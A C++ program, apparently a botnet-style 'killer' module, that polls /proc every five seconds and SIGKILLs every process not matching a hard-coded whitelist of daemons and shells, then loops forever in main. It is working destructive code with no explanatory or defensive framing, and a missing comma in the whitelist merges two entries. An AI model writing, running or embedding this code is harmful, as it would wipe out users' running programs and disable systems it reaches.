#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <dirent.h>
#include <cctype>
#include <cstring>
#include <unistd.h>
#include <signal.h>

const std::vector<std::string> whitelist = {
    "init",
    "systemd",
    "sshd",
    "cron",
    "syslogd",
    "rsyslogd",
    "NetworkManager",
    "udevd",
    "dbus-daemon",
    "cupsd",
    "httpd",
    "nginx",
    "apache",
    "mysql",
    "mariadb",
    "postgresql",
    "named",
    "bind",
    "ntpd",
    "chronyd",
    "avahi-daemon",
    "dovecot",
    "postfix",
    "cups-browsed",
    "gdm",
    "lightdm",
    "Xorg",
    "pulseaudio",
    "acpid"
    "sh",
    "bash",
    "zsh",
    "sftp-server",
    "-bash",
    "/sbin/agetty",
};

bool ShouldKillProcess(const std::string& processName) {
    for (const auto& whitelistedProcess : whitelist) {
        if (processName.find(whitelistedProcess) != std::string::npos) {
            return false;
        }
    }
    return true;
}

bool KillProcess(pid_t processId) {
    char buffer[256];
    snprintf(buffer, sizeof(buffer), "/proc/%d/cmdline", processId);
    std::ifstream cmdLineFile(buffer);
    if (cmdLineFile) {
        std::string processName;
        std::getline(cmdLineFile, processName, '\0');
        cmdLineFile.close();

        if (kill(processId, SIGKILL) == 0) {
            std::cout << "Process " << processId << " (" << processName << ") killed successfully." << std::endl;
            return true;
        } else {
            std::cerr << "Failed to kill process " << processId << " (" << processName << ")" << std::endl;
            return false;
        }
    } else {
        std::cerr << "Failed to read process command line for process " << processId << std::endl;
        return false;
    }
}

void InitKiller(bool enableKiller) {
    if (enableKiller) {
        std::thread([=]() {
            pid_t currentProcessId = getpid();

            while (enableKiller) {
                DIR* dir = opendir("/proc");
                if (dir == nullptr) {
                    std::cerr << "Failed to open directory /proc." << std::endl;
                    return;
                }

                struct dirent* entry;
                while ((entry = readdir(dir)) != nullptr) {
                    if (entry->d_type == DT_DIR && std::isdigit(entry->d_name[0])) {
                        pid_t processId = std::stoi(entry->d_name);

                        if (processId != currentProcessId) {
                            std::string cmdLinePath = std::string("/proc/") + entry->d_name + "/cmdline";
                            std::ifstream cmdLineFile(cmdLinePath);
                            if (cmdLineFile) {
                                std::string processName;
                                std::getline(cmdLineFile, processName, '\0');
                                cmdLineFile.close();

                                if (ShouldKillProcess(processName)) {
                                    KillProcess(processId);
                                }
                            }
                        }
                    }
                }

                closedir(dir);
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }).detach();
    }
}

int main() {
    InitKiller(true);  // Enable the process killer
    // Do other operations or tasks in your main function
    // ...

    // Keep the main thread alive
    while (true) {
        // Perform your main tasks or operations here
        // ...
    }

    return 0;
}
